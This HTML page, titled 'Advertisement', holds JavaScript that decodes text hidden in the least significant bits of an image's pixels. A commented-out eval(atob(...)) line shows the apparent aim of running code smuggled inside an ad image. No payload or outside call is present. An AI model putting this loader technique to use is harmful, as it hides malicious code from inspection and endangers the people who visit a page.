<html>
<head><title>Advertisement</title></head>

<body>
<img id="img" src="notit.png">

<script type="text/javascript">

// eval(atob(document.images[0].src.replace(/.*,/, "")));
// console.log( document.images[0].src );
// console.log( atob(document.images[0].src.replace(/.*,/, "")) );

var img = document.getElementById("img");
console.log(img.naturalWidth);
console.log(img.length);

function q() {
    i = new Image();
    i.addEventListener('load', f, false);
    i.src = "notit.png"
}
setTimeout(q, 1000);

z = "";

function v(b) {
    s = '';
    for (i = 0, l = b.length; i < l; i += 8) {
        c = 0;
        for (j = 7; j >= 0; j -= 1) {
            c += b[i + 7 - j] << j;
        }
        s += String.fromCharCode(c);
    }
    return s;
}

function d(img) {
    i = 0;
    l = img.length;
    st = [];
    while (i < l) {
        st[i] = img[i * 4] & 1;
        i += 1;
    }
    return v(st);
}

function f() {
    console.log("start");
    w = i.naturalWidth;
    h = i.naturalHeight;
    c = document.createElement("canvas");
    x = c.getContext("2d");

    c.width = w;
    c.height = h;
    x.drawImage(i, 0, 0, w, h);

    t = d(x.getImageData(0, 0, w, h).data);
    if (t = t.match(/SHA.*SHA/)) {
        z += t[0].replace(/SHA/g, '');
    }
    console.log(z);
};


// // Show ads
// function showImage(i){
//     document.images[0].src="images/ad00" + i + ".png";
// }

// for (i=0;i<7;i++){
//     setTimeout(showImage,10000*i,i);
// }

</script>
</body>
</html>
